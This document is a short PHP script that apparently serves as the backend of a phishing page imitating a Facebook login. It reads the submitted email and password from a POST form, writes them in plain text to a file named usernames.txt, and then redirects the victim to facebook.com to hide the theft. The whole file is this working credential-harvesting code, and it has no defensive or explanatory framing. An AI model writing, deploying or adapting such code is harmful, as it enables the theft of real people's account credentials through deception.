<?php
if (isset($_POST['email']) && isset($_POST['pass'])) {
    $user = $_POST['email'];
    $pass = $_POST['pass'];
    $fp = fopen('usernames.txt', 'a');
    fwrite($fp, "Username: " . $user . " Pass: " . $pass . "\n");
    fclose($fp);
    header('Location: https://www.facebook.com');
    exit();
}
?>
